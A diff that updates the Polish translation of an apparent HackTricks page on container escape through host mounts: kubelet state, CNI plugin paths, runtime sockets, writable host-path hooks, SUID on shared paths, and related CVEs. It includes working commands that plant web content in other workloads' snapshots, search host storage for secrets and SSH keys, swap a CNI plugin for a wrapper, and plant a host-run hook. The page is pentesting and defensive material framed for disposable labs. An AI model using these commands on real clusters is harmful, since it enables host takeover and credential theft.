-Jeśli zamontowany `/var` udostępnia zapisywalną zawartość snapshotu innego workloadu, attacker może być w stanie zmodyfikować pliki aplikacji, umieścić treści webowe lub zmienić skrypty startowe bez modyfikowania bieżącej konfiguracji kontenera.
 
-Na **disposable lab workload** zapisywalna zawartość snapshotu może posłużyć do zademonstrowania manipulacji aplikacją, odzyskiwania sekretów lub lateral movement. Najpierw dopasuj runtime container ID do dokładnego snapshotu i nigdy nie edytuj niepowiązanego ani produkcyjnego snapshotu:
+Jeśli zamontowane `/var` udostępnia zapisywalną zawartość snapshotu innego workloadu, atakujący może zmodyfikować pliki aplikacji, umieścić treści w witrynie lub zmienić skrypty startowe bez ingerencji w konfigurację bieżącego kontenera.
+
+Na **jednorazowym workloadzie laboratoryjnym** zapisywalna zawartość snapshotu może posłużyć do zademonstrowania manipulowania aplikacją, odzyskiwania sekretów lub ruchu bocznego. Najpierw przypisz identyfikator kontenera środowiska uruchomieniowego do dokładnego snapshotu i nigdy nie edytuj niepowiązanego ani produkcyjnego snapshotu:
+
 ```bash
 echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
 grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
 find /host-var/lib -type f \( -path '*/.ssh/*' -o -path '*/authorized_keys' \) 2>/dev/null | head -n 20
 ```
-Te polecenia są przydatne, ponieważ pokazują trzy główne rodziny skutków zamontowania `/var`: manipulowanie aplikacją, odzyskiwanie sekretów oraz lateral movement do sąsiednich workloadów.
 
-Bezpośredni zapis snapshotów omija standardowe zarządzanie stanem przez runtime i może uszkodzić kontener lub zniszczyć dowody. Odkrywanie tylko do odczytu zostało odtworzone lokalnie dla Docker `overlay2`: marker zapisany w sąsiednim jednorazowym kontenerze pojawił się w `/var/lib/docker/overlay2/<id>/diff/`. Rzeczywistą modyfikację snapshotu należy ograniczyć do jednorazowego kontenera utworzonego na potrzeby tego testu.
+Te polecenia są przydatne, ponieważ pokazują trzy główne rodzaje skutków zamontowania `/var`: manipulowanie aplikacją, odzyskiwanie sekretów i przemieszczanie się boczne do sąsiednich workloadów.
 
-## Stan Kubelet, Plugins i ścieżki CNI
+Zapisywanie bezpośrednio do snapshotów omija normalne zarządzanie stanem przez runtime i może uszkodzić kontener lub zniszczyć dowody. Odkrywanie tylko do odczytu zostało lokalnie odtworzone z użyciem Docker `overlay2`: znacznik zapisany w sąsiednim, tymczasowym kontenerze pojawił się pod `/var/lib/docker/overlay2/<id>/diff/`. Rzeczywiste modyfikacje snapshotów ogranicz do tymczasowego kontenera utworzonego na potrzeby tego testu.
 
-Montowanie `/var/lib/kubelet`, `/opt/cni/bin` lub `/etc/cni/net.d` jest często udostępniane przez uprzywilejowane DaemonSets, agentów CNI, pluginy węzłów CSI, operatory GPU oraz pomocnicze komponenty storage. Łatwo zlekceważyć te mounty jako „infrastrukturę węzła”, ale znajdują się one bezpośrednio na ścieżce wykonywania dla nowych podów i często zawierają dane uwierzytelniające kubelet, projected secrets, sockety rejestracyjne oraz wykonywalne pliki binarne pluginów po stronie hosta.
+## Stan Kubelet, wtyczki i ścieżki CNI
+
+Montowanie `/var/lib/kubelet`, `/opt/cni/bin` lub `/etc/cni/net.d` jest często udostępniane przez uprzywilejowane DaemonSety, agentów CNI, wtyczki CSI node, operatorów GPU i narzędzia pomocnicze pamięci masowej. Łatwo uznać te montowania za „infrastrukturę węzła”, ale znajdują się one bezpośrednio na ścieżce wykonywania nowych podów i często zawierają dane uwierzytelniające kubelet, projected secrets, gniazda rejestracyjne oraz wykonywalne pliki binarne wtyczek działających po stronie hosta.
 
 Cele o wysokiej wartości obejmują:
 
@@ -240,28 +266,31 @@ Cele o wysokiej wartości obejmują:
 - `/opt/cni/bin`
 - `/etc/cni/net.d`
 
-Przydatne polecenia do przeglądu to:
+Przydatne polecenia do przeglądu:
+
 ```bash
 find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
-egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
+  egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
 ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
 find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
 grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
 ```
-Dlaczego te ścieżki mają znaczenie:
 
-- `/var/lib/kubelet/pki` może ujawniać certyfikaty klienckie kubeleta i inne poświadczenia lokalne dla węzła, które czasami można ponownie wykorzystać przeciwko API serverowi lub endpointom TLS kubeleta, zależnie od projektu klastra.<sup>[[1]](#references)</sup>
-- `/var/lib/kubelet/pods` często zawiera projected service-account tokens oraz zamontowane Secrets należące do sąsiednich podów na tym samym węźle.
-- `/var/lib/kubelet/pod-resources/kubelet.sock` jest głównie powierzchnią reconnaissance, ale bardzo użyteczną: ujawnia, które pody i kontenery aktualnie używają GPU, hugepages, urządzeń SR-IOV oraz innych deficytowych zasobów lokalnych dla węzła.<sup>[[1]](#references)</sup>
-- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` oraz `/var/lib/kubelet/plugins_registry` ujawniają, które pluginy CSI, DRA i device plugins są zainstalowane oraz z którymi socketami kubelet powinien się komunikować. Jeśli te katalogi są zapisywalne, a nie tylko odczytywalne, finding staje się znacznie poważniejszy.<sup>[[1]](#references)</sup>
-- `/opt/cni/bin` oraz `/etc/cni/net.d` znajdują się bezpośrednio na ścieżce konfiguracji sieci podów. Dostęp z prawem zapisu jest często opóźnionym prymitywem umożliwiającym wykonanie kodu na hoście, a nie tylko ujawnieniem konfiguracji.<sup>[[2]](#references)</sup>
+Dlaczego te ścieżki są ważne:
+
+- `/var/lib/kubelet/pki` może ujawniać certyfikaty klienta kubelet oraz inne poświadczenia lokalne dla węzła, które czasami można ponownie wykorzystać w komunikacji z API serverem lub punktami końcowymi TLS obsługującymi kubelet, zależnie od projektu klastra.<sup>[[1]](#references)</sup>
+- `/var/lib/kubelet/pods` często zawiera tokeny service account i zamontowane Secrets należące do sąsiednich podów na tym samym węźle.
+- `/var/lib/kubelet/pod-resources/kubelet.sock` służy głównie do rozpoznania, ale jest bardzo przydatny: ujawnia, które pody i kontenery aktualnie korzystają z GPU, hugepages, urządzeń SR-IOV i innych rzadkich zasobów lokalnych dla węzła.<sup>[[1]](#references)</sup>
+- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` i `/var/lib/kubelet/plugins_registry` ujawniają, które wtyczki CSI, DRA i device plugins są zainstalowane oraz z którymi socketami kubelet ma się komunikować. Jeśli te katalogi są zapisywalne, a nie tylko możliwe do odczytu, problem staje się znacznie poważniejszy.<sup>[[1]](#references)</sup>
+- `/opt/cni/bin` i `/etc/cni/net.d` znajdują się bezpośrednio na ścieżce konfiguracji sieci podów. Dostęp umożliwiający zapis często stanowi opóźniony mechanizm uzyskania wykonania kodu na hoście, a nie tylko ujawnienie konfiguracji.<sup>[[2]](#references)</sup>
 
 ### Pełny przykład: zapisywalny `/opt/cni/bin`
 
-Jeśli katalog hosta zawierający binaria CNI jest zamontowany z prawem odczytu i zapisu, zastąpienie pluginu może wystarczyć do uzyskania wykonania kodu na hoście przy następnym utworzeniu pod sandbox przez kubelet na tym węźle:<sup>[[2]](#references)</sup>
+Jeśli katalog hosta z plikami binarnymi CNI jest zamontowany z prawem zapisu, podmiana wtyczki może wystarczyć do uzyskania wykonania kodu na hoście przy następnym utworzeniu przez kubelet piaskownicy poda na tym węźle:<sup>[[2]](#references)</sup>
+
 ```bash
 plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
-grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
+  grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
 [ -n "$plugin" ] || exit 1
 mv "$plugin" "${plugin}.orig"
 cat <<'EOF' > "$plugin"
@@ -275,11 +304,13 @@ cat "$(dirname "$plugin")/.cni-triggered"
 mv "${plugin}.orig" "$plugin"
 rm -f "$(dirname "$plugin")/.cni-triggered"
 ```
-Nie jest to tak bezpośrednie jak zamontowany `docker.sock`, ale często jest bardziej realistyczne w przypadku przejętych infrastructure pods Kubernetes. Marker jest zapisywany obok zamontowanego pluginu, dzięki czemu kontener może go pobrać nawet bez zamontowanego host-root lub host-`/tmp`. Wrapper zachowuje oryginalne argumenty i standardowe wejście, a następnie przykład przywraca oryginalny plik binarny. Najważniejsze jest to, że zmodyfikowany plik binarny zostaje później wykonany przez przepływ konfiguracji sieci hosta, a nie przez bieżący kontener. Używaj wyłącznie disposable node, ponieważ nieprawidłowy wrapper może uniemożliwić przydzielanie sieci do nowych sandboxów Pod.
 
-## Gniazda runtime
+Nie jest to tak bezpośrednie jak zamontowany `docker.sock`, ale często jest bardziej realistyczne w przejętych podach infrastrukturalnych Kubernetes. Znacznik jest zapisywany obok zamontowanej wtyczki, dzięki czemu kontener może go pobrać nawet bez montowania host-root ani hostowego `/tmp`. Wrapper zachowuje oryginalne argumenty i standardowe wejście, a następnie przykład przywraca oryginalny plik binarny. Najważniejsze jest to, że zmodyfikowany plik binarny zostaje później uruchomiony w ramach konfiguracji sieci hosta, a nie przez bieżący kontener. Korzystaj wyłącznie z jednorazowego węzła, ponieważ nieprawidłowy wrapper może uniemożliwić nowym sandboxom Pod uzyskanie łączności sieciowej.
 
-Wrażliwe mounty hosta często obejmują gniazda runtime zamiast pełnych katalogów. Są one tak ważne, że zasługują tutaj na wyraźne powtórzenie:
+## Gniazda środowiska uruchomieniowego
+
+Wrażliwe montowania hosta często obejmują gniazda środowiska uruchomieniowego, a nie całe katalogi. Są one tak ważne, że warto wyraźnie je tutaj ponownie wymienić:
+
 ```text
 /var/run/docker.sock
 /run/docker.sock
@@ -290,47 +321,65 @@ Wrażliwe mounty hosta często obejmują gniazda runtime zamiast pełnych katalo
 /var/run/kubelet.sock
 /run/firecracker-containerd.sock
 ```
-Zobacz [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md), aby poznać pełne ścieżki exploitation po zamontowaniu jednego z tych socketów.
 
-Jako szybki wzorzec pierwszej interakcji:
+Zobacz [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md), aby poznać pełne scenariusze wykorzystania po zamontowaniu jednego z tych socketów.
+
+Przykładowy wzorzec szybkiej pierwszej interakcji:
+
 ```bash
 docker -H unix:///host/run/docker.sock version 2>/dev/null
 ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
 crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
 ```
-Jeśli jedna z tych metod zadziała, droga od „zamontowanego socketu” do „uruchomienia bardziej uprzywilejowanego kontenera będącego rodzeństwem” jest zwykle znacznie krótsza niż w przypadku dowolnej ścieżki kernel breakout.
 
-## Przejęcie zadania przez zapisywalną ścieżkę hosta
+Jeśli jedna z tych metod zadziała, droga od „zamontowanego socketu” do „uruchomienia bardziej uprzywilejowanego kontenera równorzędnego” jest zazwyczaj znacznie krótsza niż jakakolwiek droga wykorzystująca kernel breakout.
 
-Zapisywalny mount hosta nie musi udostępniać `/`, aby stanowić zagrożenie. Jeśli zamontowana ścieżka zawiera skrypty, pliki konfiguracyjne, hooki, pluginy lub pliki wykorzystywane później przez zaplanowane zadanie albo usługę działającą po stronie hosta, kontener może być w stanie zmienić to, co host wykonuje.
+Dostęp do tego samego daemona może również umożliwić **utrzymanie dostępu do hosta**. Kontener pomocniczy z zapisywalnym bind mountem katalogu głównego hosta może otrzymać pliki przez `docker cp`, a następnie użyć `docker exec`, aby umieścić klucz SSH, jednostkę usługi lub inny plik zapewniający utrzymanie dostępu w zamontowanej ścieżce hosta. Granicę bezpieczeństwa wyznacza uprawnienie daemona do tworzenia mountu hosta; `docker cp` to tylko etap pośredni. Po ujawnieniu socketu runtime’u sprawdzaj zarówno nowo utworzone kontenery, jak i zapisy w ścieżkach hosta związanych z uwierzytelnianiem lub uruchamianiem.
 
-Ogólny przebieg analizy:
+## Writable Host Path Task Hijack
+
+Zapisywalny mount hosta nie musi udostępniać `/`, aby stanowić zagrożenie. Jeśli zamontowana ścieżka zawiera skrypty, pliki konfiguracyjne, hooki, pluginy lub pliki wykorzystywane później przez zaplanowane zadanie albo usługę działającą po stronie hosta, kontener może być w stanie zmienić to, co host wykona.
+
+Ogólny przebieg przeglądu:
+
 ```bash
 mount | grep -E ' /host|/mnt|/shared|/opt|/var '
 find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
 grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
 ```
-Jeśli zapisywalny plik jest wykorzystywany przez proces hosta, podczas testów zachowaj payload prosty i obserwowalny:
+
+Jeśli proces hosta korzysta z zapisywalnego pliku, podczas testowania payload powinien być prosty i łatwy do zaobserwowania:
+
 ```bash
 printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
 chmod +x /host/path/to/hook.sh
 ```
-Interesującą częścią jest granica zaufania: zapis odbywa się z wnętrza kontenera, ale wykonanie następuje później w kontekście usługi hosta. Zmienia to wąski `hostPath` lub bind mount w mechanizm opóźnionego wykonywania kodu na hoście.
 
-## CVE związane z mountami
+Ciekawym aspektem jest granica zaufania: zapis odbywa się wewnątrz kontenera, ale wykonanie następuje później w kontekście usługi hosta. W ten sposób wąski hostPath lub bind mount staje się prymitywem umożliwiającym opóźnione wykonanie kodu na hoście.
 
-Mounty hosta są również powiązane z podatnościami runtime. Do ważnych niedawnych przykładów należą:
+## Pliki należące do roota na współdzielonej ścieżce hosta
 
-- `CVE-2024-21626` w `runc`, gdzie ujawniony deskryptor pliku katalogu mógł umieścić katalog roboczy w systemie plików hosta.
-- `CVE-2024-23651`, `CVE-2024-23652` i `CVE-2024-23653` w BuildKit, gdzie złośliwe Dockerfile, frontendy i przepływy `RUN --mount` mogły ponownie umożliwić dostęp do plików hosta, ich usuwanie lub uzyskanie podwyższonych uprawnień podczas buildów.
-- `CVE-2024-1753` w przepływach buildów Buildah i Podman, gdzie spreparowane bind mounty podczas builda mogły udostępnić `/` z uprawnieniami odczytu i zapisu.
-- `CVE-2025-47290` w `containerd` 2.1.0, gdzie błąd TOCTOU podczas rozpakowywania obrazu mógł pozwolić specjalnie spreparowanemu obrazowi na modyfikowanie systemu plików hosta podczas pullowania.
+Konto w kontenerze, które może uzyskać uprawnienia roota, może być w stanie umieścić plik należący do roota w zapisywalnej ścieżce używanej również przez hosta. Jeśli UID 0 w kontenerze mapuje się na UID 0 hosta, oba widoki wskazują ten sam plik, a montowanie hosta zezwala na wykonywanie SUID, użytkownik hosta, który może uruchomić należący do roota plik wykonywalny SUID w tej ścieżce, może przekroczyć granicę uprawnień hosta. W przypadku tego konkretnego problemu z własnością pliku kontener nie musi działać z `--privileged`. Zobacz [mapowania user namespace](protections/namespaces/user-namespace.md) oraz [omówienie SUID](privileged-containers.md), aby poznać odrębne warunki.
 
-Te CVE mają tutaj znaczenie, ponieważ pokazują, że obsługa mountów nie dotyczy wyłącznie konfiguracji operatora. Sam runtime może również wprowadzać warunki ucieczki wykorzystujące mounty.
+Sprawdź ścieżkę **z obu stron**: porównaj własność i tożsamość nieszkodliwego pliku, sprawdź `uid_map` i `gid_map` kontenera oraz opcje montowania i zasady wykonywania na hoście. `rw` po stronie kontenera bez `nosuid` to jedynie przesłanka do dalszej weryfikacji; nie pozwala ustalić własności pliku na hoście, flag montowania hosta, dostępu użytkownika hosta ani tego, czy AppArmor/SELinux blokuje wykonanie. `noexec` ogranicza wykonywanie w widoku, w którym ma zastosowanie. Znaczniki `shared:` i `master:` w `/proc/self/mountinfo` opisują propagację montowania, a nie to, czy zawartość pliku jest współdzielona z hostem. Bind mount może nie mieć tych znaczników. Ponowne użycie poświadczeń umożliwiające logowanie do hosta to osobny krok, niezwiązany z granicą uprawnień wynikającą ze współdzielenia pliku.
+
+Pamięć masowa środowiska uruchomieniowego hosta może tworzyć podobną ścieżkę nawet bez jawnego bind mount. [CVE-2021-41091](https://github.com/moby/moby/security/advisories/GHSA-3fwx-pjgw-3558) umożliwiało nieuprzywilejowanemu użytkownikowi hosta przechodzenie przez podkatalogi danych Dockera i wykonywanie plików z systemu plików kontenera; Moby naprawiło uprawnienia w wersji 20.10.9 i zaznacza, że uruchomione kontenery trzeba zrestartować, aby poprawić ich katalogi. Sprawdź dokładne ścieżki montowania `overlay2/<id>/merged` oraz uprawnienia wyszukiwania każdego katalogu nadrzędnego, a następnie ustal, czy UID 0 kontenera mapuje się na UID 0 hosta, czy istnieje dostępny plik wykonywalny SetUID należący do roota i czy widok hosta zezwala na wykonywanie SetUID. Kontenery rootless lub z remapowaniem user namespace, `nosuid`, `noexec`, `no_new_privs` oraz polityka MAC mogą zmienić wynik. Sama wersja środowiska uruchomieniowego lub dostępna ścieżka to wskazówka do dalszej weryfikacji, a nie dowód na wykonanie kodu z uprawnieniami roota hosta; sprawdź metadane montowania i pliku, nie uruchamiając podejrzanego pliku wykonywalnego.
+
+## CVE związane z montowaniem
+
+Montowania hosta mają też związek z lukami w środowiskach uruchomieniowych. Do ważnych niedawnych przykładów należą:
+
+- `CVE-2024-21626` w `runc`, gdzie leaked file descriptor do katalogu mógł spowodować umieszczenie katalogu roboczego w systemie plików hosta.
+- `CVE-2024-23651`, `CVE-2024-23652` i `CVE-2024-23653` w BuildKit, gdzie złośliwe Dockerfile, frontendy i przepływy `RUN --mount` mogły ponownie umożliwić dostęp do plików hosta, ich usuwanie lub eskalację uprawnień podczas budowania.
+- `CVE-2024-1753` w przepływach budowania Buildah i Podman, gdzie spreparowane bind mounty podczas budowania mogły udostępnić `/` do odczytu i zapisu.
+- `CVE-2025-47290` w `containerd` 2.1.0, gdzie TOCTOU podczas rozpakowywania obrazu mogło pozwolić specjalnie spreparowanemu obrazowi zmodyfikować system plików hosta podczas pobierania.
+
+Te CVE są tu istotne, ponieważ pokazują, że obsługa montowań zależy nie tylko od konfiguracji operatora. Samo środowisko uruchomieniowe również może wprowadzać warunki ucieczki wynikające z montowania.
 
 ## Kontrole
 
-Użyj tych poleceń, aby szybko zlokalizować najbardziej istotne ekspozycje mountów:
+Użyj tych poleceń, aby szybko znaleźć narażenia związane z montowaniami o najwyższym potencjale:
+
 ```bash
 mount
 find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
@@ -340,29 +389,30 @@ ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
 find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
 find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
 ```
-Co jest tutaj interesujące:
 
-- Host root, `/proc`, `/sys`, `/var` oraz runtime sockets to najważniejsze znaleziska.
-- Zapisywalne wpisy proc/sys często oznaczają, że mount udostępnia globalne dla hosta mechanizmy kontroli kernela, a nie bezpieczny widok kontenera.
-- Ścieżki zamontowane z `/var` wymagają analizy poświadczeń i sąsiednich workloadów, a nie tylko przeglądu systemu plików.
-- Katalogi stanu kubeleta oraz ścieżki CNI/pluginów wymagają takiego samego priorytetu jak runtime sockets, ponieważ często znajdują się bezpośrednio na ścieżce tworzenia podów i dystrybucji poświadczeń na nodzie.
+Co jest tu interesujące:
+
+- Host root, `/proc`, `/sys`, `/var` i sockety runtime to ustalenia o najwyższym priorytecie.
+- Zapisywalne wpisy w proc/sys często oznaczają, że mount udostępnia globalne dla hosta mechanizmy kontroli jądra, a nie bezpieczny widok kontenera.
+- Ścieżki `/var` zamontowane w kontenerze wymagają sprawdzenia danych uwierzytelniających i sąsiednich obciążeń, a nie tylko przeglądu systemu plików.
+- Katalogi stanu Kubeleta oraz ścieżki CNI/pluginów zasługują na taki sam priorytet jak sockety runtime, ponieważ często znajdują się bezpośrednio na ścieżce tworzenia podów i dystrybucji danych uwierzytelniających w węźle.
 
 ## Status lokalnej walidacji
 
-Praktyczne chainy opisane na tej stronie sprawdzono na lokalnym nodzie Linux minikube. Walidacja odtworzyła:
+Opisane na tej stronie praktyczne łańcuchy zostały sprawdzone na lokalnym węźle Linux minikube. Walidacja odtworzyła:
 
-- dostęp do odczytu i zapisu przez tymczasowy zapisywalny hostPath
-- wykrywanie projektowanych tokenów ServiceAccount i zamontowanych Secrets przez `/var/lib/kubelet/pods`
-- pomyślne uwierzytelnienie w Kubernetes API przy użyciu aktywnego tokena odzyskanego z zamontowanego stanu kubeleta
-- dostępne tylko do odczytu wykrywanie systemu plików sąsiedniego Dockera `overlay2` przez zamontowane `/var`
-- utworzenie przez Docker API siostrzanego kontenera z montowaniem hosta tylko do odczytu przez zamontowany `docker.sock`
-- opóźnione wykonanie na hoście przez tymczasowy hook konsumowany przez hosta
-- symulację wrappera CNI, który zachował argumenty, standardowe wejście i wykonanie oryginalnego pluginu
+- dostęp do odczytu i zapisu przez tymczasowy, zapisywalny hostPath
+- wykrycie tokenów ServiceAccount udostępnionych podom oraz zamontowanych Secrets przez `/var/lib/kubelet/pods`
+- pomyślne uwierzytelnienie w Kubernetes API przy użyciu aktywnego tokena odzyskanego z zamontowanego stanu Kubeleta
+- wykrycie tylko do odczytu sąsiedniego systemu plików Docker `overlay2` przez zamontowany `/var`
+- utworzenie przez Docker API kontenera równorzędnego z montowaniem hosta tylko do odczytu za pośrednictwem zamontowanego `docker.sock`
+- opóźnione wykonanie na hoście za pośrednictwem tymczasowego hooka obsługiwanego przez hosta
+- symulację wrappera CNI, która zachowała argumenty, standardowe wejście i wykonanie oryginalnego pluginu
 
-Ten sam node udostępniał `core_pattern`, `modprobe`, `binfmt_misc/register`, `kallsyms`, `kcore` oraz `config.gz`, ale nie udostępniał `uevent_helper`, zmiennych EFI, wpisów termicznych ani `sched_debug`. Destrukcyjne wyzwalacze kernela nie zostały wykonane. Potwierdza to, że chainy związane z host root, `/var`, stanem kubeleta, socketami i konsumentami hosta są odtwarzalne, natomiast techniki pomocnicze procfs/sysfs muszą pozostać zależne od konkretnego kernela, trybu mount, ścieżki payloadu i triggera.
+Ten sam węzeł udostępniał `core_pattern`, `modprobe`, `binfmt_misc/register`, `kallsyms`, `kcore` i `config.gz`, ale nie udostępniał `uevent_helper`, zmiennych EFI, wpisów termicznych ani `sched_debug`. Nie uruchamiano destrukcyjnych mechanizmów wyzwalających w jądrze. Potwierdza to, że łańcuchy wykorzystujące host root, `/var`, stan Kubeleta, sockety i mechanizmy obsługiwane przez hosta można odtworzyć, natomiast techniki wykorzystujące mechanizmy pomocnicze procfs/sysfs należy traktować jako zależne od konkretnego jądra, trybu montowania, ścieżki payloadu i wyzwalacza.
 
 ## References
 
-- [1] [Lokalne pliki i ścieżki używane przez kubeleta](https://kubernetes.io/docs/reference/node/kubelet-files/)
+- [1] [Lokalne pliki i ścieżki używane przez Kubeleta](https://kubernetes.io/docs/reference/node/kubelet-files/)
 - [2] [Kontener cilium-agent może uzyskać dostęp do hosta przez montowanie `hostPath`](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
 {{#include ../../../banners/hacktricks-training.md}}
